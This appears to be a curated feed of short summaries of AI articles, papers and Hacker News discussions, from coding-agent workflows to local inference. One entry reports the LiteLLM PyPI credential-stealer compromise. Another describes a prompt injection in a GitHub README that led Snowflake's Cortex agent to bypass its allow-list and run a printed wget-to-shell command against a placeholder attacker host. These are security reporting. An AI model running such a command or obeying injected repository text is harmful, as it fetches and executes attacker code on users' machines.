title: A Few Random Notes from Claude Coding: Slopacolypse and Brain Atrophy
description: Andrej Karpathy shares extensive field notes from coding with Claude AI, discussing his workflow changes and the dramatic shift in programming due to AI in just 2 months. He coins the term 'Slopacolypse' for 2026 - predicting a flood of AI-generated content across GitHub, Substack, Arxiv, X/Instagram, and all digital media. Raises concerns about brain atrophy as AI writes most of his code, making it harder to maintain manual coding skills.
author: Andrej Karpathy

title: Polaris: A Gödel Agent Framework for Small Language Models
description: Introduces Polaris, a framework for small language models using Gödel agent principles and experience-abstracted policy repair. Demonstrates how smaller models can achieve agent capabilities through policy repair techniques.
author: Aditya Kakade, Vivek Srivastava, Shirish Karande

title: SortedRL: Accelerating RL Training for LLMs through Online Length-Aware Scheduling
description: Presents SortedRL, a method to accelerate reinforcement learning training for large language models using length-aware scheduling. Addresses efficiency challenges in RL-based LLM training.
author: Yiqi Zhang, Huiqiang Jiang, Xufang Luo, et al.

title: Caterpillar of Thoughts: The Optimal Test-Time Algorithm for Large Language Models
description: Introduces 'Caterpillar of Thoughts' as an optimal test-time algorithm for LLMs, proposing a new approach to reasoning and inference optimization.
author: Amir Azarmehr, Soheil Behnezhad, Alma Ghafari

title: Bilevel Autoresearch: Meta-Autoresearching Itself
description: Presents a bilevel optimization approach for automated AI research systems. Notable as being partially drafted by AI agents, exploring meta-learning for autonomous research.
author: Yaonan Qu, Meng Lu

title: ABSTRAL: Automatic Design of Multi-Agent Systems
description: Introduces ABSTRAL for automatic design of multi-agent systems through iterative refinement. Addresses topology optimization and automated agent architecture design.
author: Weijia Song, Jiashu Yue, Zhe Pang

title: From Static Templates to Dynamic Runtime Graphs: A Survey of Workflow Optimization for LLM Agents
description: Comprehensive survey on workflow optimization for LLM agents, covering the transition from static templates to dynamic runtime graphs in agent orchestration.
author: Ling Yue, Kushal Raj Bhandari, Ching-Yun Ko, et al.

title: LLM Olympiad: Why Model Evaluation Needs a Sealed Exam
description: Argues for sealed exam environments in LLM evaluation to prevent data contamination and ensure fair assessment of model capabilities.
author: Jan Christian Blaise Cruz, Alham Fikri Aji

title: Show HN: OpenCode - Open Source AI Coding Agent
description: Discussion about OpenCode, an open-source AI coding agent alternative to proprietary tools like Claude Code and Codex. Covers technical comparisons, with users noting OpenCode (TypeScript) uses 1GB+ RAM vs Codex (Rust) being more efficient. Discussion includes security concerns about prompts sent to Grok, licensing issues with Anthropic prohibiting Claude subscription use with third-party tools, and debates about rapid release cycles.
author: Hacker News Community

title: LLM Merge Rates and Code Quality Discussion
description: Deep technical discussion about whether LLMs are actually improving at writing code. Users debate evidence suggesting LLM merge rates haven't improved significantly over the past year, tension between models producing more vs. better code, real-world experiences with GPT 5.4, Opus 4.6, and Claude Sonnet, 'vibe coding' practices, and code review importance with AI-generated code.
author: Hacker News Community

title: Architect → Developer → Reviewer Pipeline Discussion
description: Discussion examines whether splitting AI coding tasks into architect, developer, and reviewer roles produces better results than one strong model. Debates include multi-agent pipelines effectiveness vs. 'cargo cult' behavior, cost considerations using cheaper models for implementation, role of human expertise in guiding AI, and how AI is changing software engineers from 'code writers' to 'architects and reviewers'.
author: Hacker News Community

title: Company Mandates on AI Tool Usage Discussion
description: Discussion about companies forcing employees to use AI coding tools. Troubling anecdotes include measuring token consumption in performance reviews, managers mandating 50% staff replacement with AI within a year, disconnect between management's AI expectations vs reality, comparisons to previous tech hype cycles, and developer pushback against metrics that don't reflect actual productivity.
author: Hacker News Community

title: Malicious litellm_init.pth in litellm 1.82.8 — credential stealer
description: The LiteLLM v1.82.8 package published to PyPI was compromised with a credential stealer hidden in base64 in a litellm_init.pth file. Installing the package triggers it without needing to import litellm. PyPI quarantined the package within a few hours. The attack stole a bewildering array of secrets from ~/.ssh/, ~/.aws/, ~/.kube/, ~/.config/, ~/.azure/, ~/.docker/, npmrc, vault tokens, and many more credential files. This supply chain attack started with an exploit against Trivy, a security scanner used in CI by LiteLLM.
author: Simon Willison

title: Streaming Experts: Running 1 Trillion Parameter Models on Consumer Hardware
description: Dan Woods and others are running massive Mixture-of-Experts models on hardware without enough RAM by streaming necessary expert weights from SSD for each token processed. Latest achievement: Kimi K2.5 (1 trillion parameters with 32B active weights) running on 96GB RAM on an M2 Max MacBook Pro. Also Qwen3.5-397B-A17B running on an iPhone at 0.6 tokens/second. The technique uses autoresearch loops to find optimizations.
author: Simon Willison

title: Tell HN: Litellm 1.82.7 and 1.82.8 on PyPI are Compromised
description: Hacker News discussion about the LiteLLM supply chain attack where versions 1.82.7 and 1.82.8 were compromised with credential stealing malware.
author: dot_treo

title: Hypura – A storage-tier-aware LLM inference scheduler for Apple Silicon
description: A storage-tier-aware LLM inference scheduler specifically designed for Apple Silicon hardware, optimizing for the memory hierarchy.
author: tatef

title: Show HN: ProofShot – Give AI coding agents eyes to verify the UI they build
description: ProofShot gives AI coding agents visual verification capabilities to check the UI they produce, addressing a key gap in agentic coding workflows.
author: jberthom

title: Is Anybody Else Bored of Talking About AI?
description: A discussion post exploring AI fatigue and whether the constant AI discourse is becoming tiresome for the developer community.
author: jakelsaunders94

title: Release: datasette-files 0.1a2
description: New plugin for uploading files directly into Datasette instances. Introduces file_actions plugin hook for extensibility, JSON upload API for batch file uploads, automatic thumbnail generation for images, adopts new column_types system from Datasette 1.0a26, and ability to import uploaded CSV/TSV files directly into database tables.
author: Simon Willison

title: The Definition of 'Slop' in AI Content
description: Slop is defined as something that takes more human effort to consume than it took to produce. When a coworker sends raw AI output without review, they're not expressing freedom to create, but disrespecting the value of the recipient's time.
author: Neurotica (@schwarzgerat.bsky.social)

title: The Real Work of Software Development: What LLMs Can't Replace
description: The hardest parts of software development were never about typing code—understanding systems, debugging incomprehensible things, designing architectures that won't collapse, and making decisions that save months of pain. None of these problems can be solved by LLMs. They don't understand the system, don't carry context, and don't know why decisions are right or wrong. The real work—knowing what should exist and why—is still yours.
author: David Abram

title: Andrej Karpathy's autoresearch: AI Agents Conduct Autonomous ML Research
description: Karpathy's autoresearch project enables autonomous AI research - giving AI agents a small but real LLM training setup (simplified nanochat) to run experiments autonomously. Agents modify code, train for 5 minutes, check results on validation bits per byte, and iterate independently. Designed to run ~100 experiments overnight while you sleep. Demonstrates practical autonomous AI research on single-GPU hardware.
author: Andrej Karpathy

title: Turbo Pascal 3.02A Deconstructed - Then Debunked as AI Hallucination
description: Simon Willison used Claude to decompile Turbo Pascal 3.02A (39,731 bytes from 1986) and create an annotated artifact. However, a Hacker News reviewer found the assembly annotations were 'hallucinated slop'—the code snippets don't appear in the actual binary at all. Simon updated with the critique and Claude agreed the annotations were fabricated. This highlights the importance of verification when using AI for binary analysis.
author: Simon Willison

title: Cursor Composer 2 Built on Kimi K2.5 Model
description: Cursor AI launched Composer 2, built on top of Kimi K2.5 model. Kimi.ai highlighted that Cursor accesses K2.5 via FireworksAI hosted RL and inference platform as part of an authorized commercial partnership, noting this as an example of the open model ecosystem they support.
author: Kimi.ai @Kimi_Moonshot

title: SQLite Tags Benchmark: Comparing 5 Tagging Strategies
description: Benchmark comparing five tagging strategies in SQLite with 100,000 rows, 100 tags, average 6.5 tags/row. Indexed approaches—materialized lookup tables on JSON and classic many-to-many tables—easily outperform others, handling single-tag queries in under 1.5 milliseconds. FTS5 came second. Full table scans with LIKE performed better than expected, but JSON arrays with json_each() were much slower.
author: Simon Willison

title: Thoughts on OpenAI Acquiring Astral (uv/ruff/ty)
description: OpenAI announced acquisition of Astral, the company behind uv, ruff, and ty—three increasingly load-bearing open source projects in the Python ecosystem. Simon shares detailed thoughts on this acquisition and its implications for the Python community.
author: Simon Willison

title: Agentic Personas for Adaptive Scientific Explanations with Knowledge Graphs
description: Paper on using agentic personas to provide adaptive scientific explanations enhanced by knowledge graphs. Explores how agents can adopt different personas for better explanation delivery.
author: Susana Nunes, Tiago Guerreiro, Cátia Pesquita

title: Autoresearching Apple's 'LLM in a Flash' to Run Qwen 397B Locally
description: Dan Woods got Qwen3.5-397B-A17B running at 5.5+ tokens/second on a 48GB MacBook Pro M3 Max despite the model taking 209GB (120GB quantized) on disk. Using Apple's LLM in a flash paper techniques and Andrej Karpathy's autoresearch pattern, Claude ran 90 experiments producing MLX Objective-C and Metal code. The model uses 2-bit quantization for experts (4-bit in updated version), with non-expert parts at original precision, totaling 5.5GB resident in memory.
author: Simon Willison

title: Release: datasette 1.0a26 with New column_types System
description: Alpha 26 in the Datasette 1.0 series introduces new column_types system for semantic column type assignments, serving as foundation for improved data type handling in Datasette plugins.
author: Simon Willison

title: Snowflake Cortex AI Escapes Sandbox and Executes Malware
description: PromptArmor reported a prompt injection attack chain in Snowflake's Cortex Agent. Attack started when a user asked the agent to review a GitHub repo with prompt injection hidden in the README. The agent executed 'cat < <(sh < <(wget -q0- https://ATTACKER_URL.com/bugbot))' without approval. Cortex listed cat commands as safe without protecting against process substitution. Simon argues allow-lists against command patterns are inherently unreliable and prefers deterministic sandboxes.
author: Simon Willison

title: DomAgent: Leveraging Knowledge Graphs and Case-Based Reasoning for Domain-Specific Code Generation
description: Paper on DomAgent, which uses knowledge graphs and case-based reasoning for domain-specific code generation. Accepted to AAMAS 2026. Combines retrieval with case-based approaches to improve code generation quality for specific domains.
author: Shuai Wang, Dhasarathy Parthasarathy, Robert Feldt, Yinan Yu

title: A Blueprint for Self-Evolving Coding Agents in Vehicle Aerodynamic Drag Prediction
description: Paper presenting a blueprint for self-evolving coding agents applied to vehicle aerodynamic drag prediction. Demonstrates how agents can evolve and adapt in engineering applications.
author: Jinhui Ren, Huaiming Li, Yabin Liu, et al.

title: Reasoning Provenance for Autonomous AI Agents: Structured Behavioral Analytics Beyond State Checkpoints
description: Paper on reasoning provenance for autonomous AI agents, proposing structured behavioral analytics that go beyond simple state checkpoints and execution traces to better understand agent decision-making.
author: Neelmani Vispute

title: EnterpriseLab: A Full-Stack Platform for Developing and Deploying Agents in Enterprises
description: Paper introducing EnterpriseLab, a full-stack platform specifically designed for developing and deploying AI agents within enterprise environments.
author: Ankush Agarwal, Harsh Vishwakarma, Suraj Nagaje, Chaitanya Devaguptapu

title: AdaRubric: Task-Adaptive Rubrics for LLM Agent Evaluation
description: Paper introducing AdaRubric, a framework for task-adaptive rubrics to evaluate LLM agents more effectively across different types of tasks.
author: Liang Ding

title: AgentHER: Hindsight Experience Replay for LLM Agent Trajectory Relabeling
description: Paper presenting AgentHER, which applies Hindsight Experience Replay (HER) techniques to LLM agent trajectories for improved learning through relabeling.
author: Liang Ding

title: The AI Scientific Community: Agentic Virtual Lab Swarms
description: Paper proposing agentic virtual lab swarms as a model for AI-driven scientific discovery, where multiple agents collaborate like a scientific community.
author: Ulisses Braga-Neto

title: Improving Coherence and Persistence in Agentic AI for System Optimization
description: Paper on techniques to improve coherence and persistence in agentic AI systems, specifically for system optimization tasks.
author: Pantea Karimi, Kimia Noorbakhsh, Mohammad Alizadeh, Hari Balakrishnan

title: The Library Theorem: How External Organization Governs Agentic Reasoning Capacity
description: Paper presenting the Library Theorem, which explains how external organization and knowledge structures govern the reasoning capacity of agentic AI systems.
author: Zachary F. Mainen
